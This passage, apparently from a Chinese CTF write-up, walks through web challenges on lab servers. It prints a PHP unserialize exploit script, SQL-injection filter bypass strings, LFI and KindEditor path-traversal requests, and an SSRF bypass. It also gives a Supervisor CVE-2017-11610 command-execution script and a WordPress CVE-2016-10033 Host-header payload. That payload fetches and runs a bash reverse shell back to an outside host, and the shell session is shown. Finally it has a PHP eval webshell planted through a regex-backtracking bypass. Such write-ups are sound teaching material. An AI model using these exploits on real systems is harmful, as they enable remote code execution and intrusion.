        $check = check_url($url);
        if($check){
            $string = $_GET['string'];
            aaa_unserialize($string);
        }
    }
    if(isset($_GET['showsource'])){
        show_source(__FILE__);
    }
```

exp.py

```python
import requests

url = "http://10.214.160.13:10010/index.php"

payload = (
    'O:+8:"aaaClass":4:{'
    'S:19:"\\00aaaClass\\00question1";s:0:"";'
    'S:19:"\\00aaaClass\\00question2";s:23:"system(\'cat flag.php\');";'
    'S:16:"\\00aaaClass\\00answer";s:0:"";'
    '}'
)

params = {
    "string": payload
}

data = {
    "url": "http://www.melodia.pw:80@gov.cn"
}

try:
    response = requests.post(url, params=params, data=data, timeout=10)
except Exception as e:
    print(f"Request failed: {e}")
    exit()

print(response.text)
```

拿到flag

```
$flag = "AAA{M4Y_B3_1TS_N0T_D1FF1CULT}";
```



### {19} 义磊奇侠传

> 第一关不是注入

进入页面的index.php之后只有一个按钮，点击进入chapter.php

```html
http://10.214.160.13:10009/chapter.php
POST chapter=chapter1
... <a href="query.php?id=1">TEST</a>
```

在query.php页面尝试了一下SQL注入，发现只能得到数据库的名字叫web500，好多关键词被过滤了

```
http://10.214.160.13:10009/query.php?id=1
flag在哪里呀，flag在哪里，flag就在就在就在....
```

尝试了很久之后决定放弃query.php，开始对chapter.php页面的chapter参数进行尝试，发现基本上返回假的flag，说明后端有在进行判断，推测存在LFI

这个是后来拿到源代码里面的逻辑，作者放了两个假的flag🙄

```php
if (stripos('flag', $file) !== FALSE) {
	die("<?php $flag='AAA{0h_4r3_y0u_sur3??}';");
}
if(!@readfile($realfile)){
    exit('AAA{th1s_1s_th3_tru3_f14g!!}');
}
```

经过不断尝试终于找到入口

```
chapter=../config.php(query.php/chapter.php)
```

得到源代码，发现query.php确实存在SQL注入

```php
<?php
	include "config.php";
	if (isset($_GET['id'])) {
		$id = $_GET['id'];
	}else{
		$id = '1';
	}
	$check= preg_match('/select|%|insert|update|delete|union|into|load_file|outfile|or|\/\*/i', $id); 
	if($check) { 
	    exit ("Melody：我是基佬，我就不让你注入");
	}
	$id = str_replace("union", "", $id);
	$id = str_replace("update", "", $id);
	$id = str_replace("into", "", $id);
	$id = str_replace("exec", "", $id);
	$id = str_replace("select", "", $id);
	$id = str_replace("delete", "", $id);
	$id = str_replace("declear","",$id);
	$id = str_replace("insert", "", $id);
      $conn->query("SET NAMES utf8");
	$sql = "select content from article where id = '".$id."'";
	$result = $conn->query($sql);
	while($row = $result->fetch_assoc()){
		print $row['content'];
		print "<br />";
  	}
	$result->free();
	$conn->close();
?>
```

注意到check和replace中的关键词有区别，其中exec和declear是新加的，考虑到在原来的语句中插入declear绕过正则匹配，并且被replace掉，就能够进行注入

```
?id=-1' unideclearon seldeclearect group_concat(table_name) from infodeclearrmation_schema.tables where table_schema=database() %23
article,secret

?id=-1' unideclearon seldeclearect group_concat(column_name) from infodeclearrmation_schema.columns where table_name='secret' %23
secret

?id=-1' unideclearon seldeclearect secret from secret %23
/jilaokaikulian/kindeditor.js
```

以为是kindeditor编辑器的文件上传cve漏洞，结果upload直接被删除了

最后开始查看默认的文件

```
http://10.214.160.13:10009/jilaokaikulian/examples/default.html
```

发现里面有allowFileManager配置打开了

```
editor = K.create('textarea[name="content"]', {
    allowFileManager : true
});
```

默认情况下，KindEditor 的文件管理功能是关闭的。一旦开启，编辑器工具栏里的 插入图片 或 插入文件 对话框中，就会多出一个 浏览服务器 或 文件空间 的按钮。
这个里面点击上传图片能看到一个查找文件的请求，可以用来遍历目录

```
http://10.214.160.13:10009/jilaokaikulian/php/file_manager_json.php?path=&order=NAME&dir=image&1775837840658
```

去掉后面的部分进行遍历

```
http://10.214.160.13:10009/jilaokaikulian/php/file_manager_json.php?path=../../../&order=NAME
```

返回信息

```
{"moveup_dir_path":"..\/","current_dir_path":"..\/..\/","current_url":"\/jilaokaikulian\/php\/..\/attached\/..\/..\/","total_count":8,"file_list":[{"is_dir":true,"has_file":true,"filesize":0,"is_photo":false,"filetype":"","filename":"file","datetime":"2016-11-17 19:38:13"},{"is_dir":true,"has_file":true,"filesize":0,"is_photo":false,"filetype":"","filename":"jilaokaikulian","datetime":"2016-12-19 15:26:41"},{"is_dir":false,"has_file":false,"filesize":418,"dir_path":"","is_photo":false,"filetype":"php","filename":"chapter.php","datetime":"2016-11-19 05:47:22"},{"is_dir":false,"has_file":false,"filesize":185,"dir_path":"","is_photo":false,"filetype":"php","filename":"config.php","datetime":"2019-07-30 06:07:30"},{"is_dir":false,"has_file":false,"filesize":53,"dir_path":"","is_photo":false,"filetype":"php","filename":"flag_is_here.php","datetime":"2016-11-17 15:33:33"},{"is_dir":false,"has_file":false,"filesize":689,"dir_path":"","is_photo":false,"filetype":"php","filename":"index.php","datetime":"2016-11-17 15:33:33"},{"is_dir":false,"has_file":false,"filesize":898,"dir_path":"","is_photo":false,"filetype":"php","filename":"query.php","datetime":"2016-11-17 20:06:42"},{"is_dir":false,"has_file":false,"filesize":164,"dir_path":"","is_photo":false,"filetype":"php","filename":"s3cr3t.php","datetime":"2016-11-17 15:33:36"}]}
```

其实就是列举了根目录的文件和文件夹

```
文件夹：file,jilaokaikulian
文件：chapter.php,config.php,flag_is_here.php,index.php,query.php,s3cr3t.php
```

最后再次使用chapter的LFI读取flag_is_here.php

```
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>义磊奇侠传</title>
</head>
<body>
<?php
	$flag = "AAA{yilei:my_turtle_i_love_you!}";
?>
</body>
</html>
```

拿到真的flag

```
AAA{yilei:my_turtle_i_love_you!}
```



### {20} SSRF

> https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html

p神的文章要好好拜读，其中的漏洞也已经指出

linux里面会把0.0.0.0映射到本机，所以可以直接用这个来绕过检查（雾）

```
10.214.160.13:10011/http://0.0.0.0:9999/flag
```



### {21} ARITHMETIC CAPTCHA



### {22} Supervisor

> CVE-2017-11610

文章：https://zhuanlan.zhihu.com/p/718767022

可以构造一个poc脚本

将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件

```
#!/usr/bin/env python3
import xmlrpc.client
import sys

target = sys.argv[1]
command = sys.argv[2]
with xmlrpc.client.ServerProxy(target) as proxy:
    old = getattr(proxy, 'supervisor.readLog')(0,0)

    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
    result = getattr(proxy, 'supervisor.readLog')(0,0)

    print(result[len(old):])
```

在linux里面调用脚本

```
lry@LRY:~/tools$ python3 poc.py http://10.214.160.13:19001/RPC2 ls
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

发现flag，尝试之后确定是一个可直接读取的文件

```
lry@LRY:~/tools$ python3 poc.py http://10.214.160.13:19001/RPC2 'cat /flag'
```

拿到flag，关注离别歌大神

```
AAA{f0llOw_leavesongs.com_666}
```



### {23} WordPress

> CVE-2016-10033

WordPress 4.6 版本远程代码执行漏洞是一个非常严重的漏洞，未经授权的攻击者利用该漏洞就能实现远程代码执行，针对目标服务器实现即时访问，最终导致目标应用服务器的完全陷落。无需插件或者非标准设置，就能利用该漏洞。Dawid Golunski还在poc中为我们展示了精彩的替换 ／ 和 “ ”(表示空格)的技巧。

文章：

https://cloud.tencent.com/developer/article/1043654

https://nosec.org/home/detail/1498.html

1. 所有 / 用 ${substr{0}{1}{$spool_directory}} 代替
2. 所有 空格 用 ${substr{10}{1}{$tod_log}} 代替

新建1.txt

```
bash -i >& /dev/tcp/10.196.145.22/4444 0>&1
```

让远程服务器下载，并执行

```
aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell${substr{10}{1}{$tod_log}}10.196.145.22${substr{0}{1}{$spool_directory}}1.txt}}null)
```

然后就是填入传输的模板，替换host头

```
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: aa(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}--output-document${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}shell${substr{10}{1}{$tod_log}}10.196.145.22${substr{0}{1}{$spool_directory}}1.txt}}null)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: http://10.214.160.13:10012
Cookie: wordpress_test_cookie=WP+Cookie+check
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

user_login=admin&redirect_to=&wp-submit=Get+New+Password
```

反弹shell

```
(base) PS C:\Users\lry> ncat -nvlp 4444
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.214.160.13:42806.
bash: cannot set terminal process group (1359): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dee372924369:/$ cat flag
cat flag
AAA{bad_php_Mai1er_0rz}
```

拿到flag

```
AAA{bad_php_Mai1er_0rz}
```



### {24} html2pdf



### {25} html2pdf_nonet



### {33} re0

```php+HTML
<?php
function is_evil_php($data){
    return preg_match('/<\?.*[(`;?>].*/is', $data);
}
$content = $_POST['code'];
if ($content != '') {
    $user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);
    if (is_evil_php($content)) {
        die("Hacker!!!");
    } else {
        @mkdir($user_dir, 0755);
        $path = $user_dir . '/' . random_int(0, 5) . '.php';
        $f = fopen($path, "w");
        fwrite($f, $content);
        header("Location: $path", true, 303);
    }
}
show_source(__FILE__);
```

比如我用POST发送code=hello

```
http://127.0.0.1:61234/data/0e83740d2d7c92de636a19f4ee851319/3.php
hello
```

https://blog.csdn.net/qq_20643933/article/details/134430769

```
import requests
from io import BytesIO

payload = BytesIO(b'success<?php eval($_GET[txt]);//' + b'a' * 1000000)

data = {
    'code': payload
}

res = requests.post('http://127.0.0.1:61234/index.php', data=data, allow_redirects=False)
print(res.headers)
```

然后开始找flag

修改参数，将路径改为根目录，print_r(scandir('/'));

```txt
http://127.0.0.1:61234/data/0e83740d2d7c92de636a19f4ee851319/0.php?txt=print_r(scandir(%27/%27));
Array ( [0] => . [1] => .. [2] => bin [3] => boot [4] => dev [5] => etc [6] => f1ag_1s_0bvioussss [7] => home [8] => lib [9] => lib64 [10] => media [11] => mnt [12] => opt [13] => proc [14] => root [15] => run [16] => sbin [17] => srv [18] => sys [19] => tmp [20] => usr [21] => var )
```

发现f1ag_1s_0bvioussss，直接system('cat /f1ag_1s_0bvioussss');

```txt
http://127.0.0.1:61234/data/0e83740d2d7c92de636a19f4ee851319/0.php?txt=system(%27cat%20/f1ag_1s_0bvioussss%27);
ZJUCTF{d0_u_knoW_the_t1me_cOmplex1ty_0f_A_reg3x_engin3}
```

拿到flag

```txt
ZJUCTF{d0_u_knoW_the_t1me_cOmplex1ty_0f_A_reg3x_engin3}
```



### {34} master of math



### {35} baby SSRF



### {36} baby servlet



### {37} easy sql



### {38} easy blade



### {39} 山雀



### {40} Upload?



### {41} ezphishing



### {42} Aviator
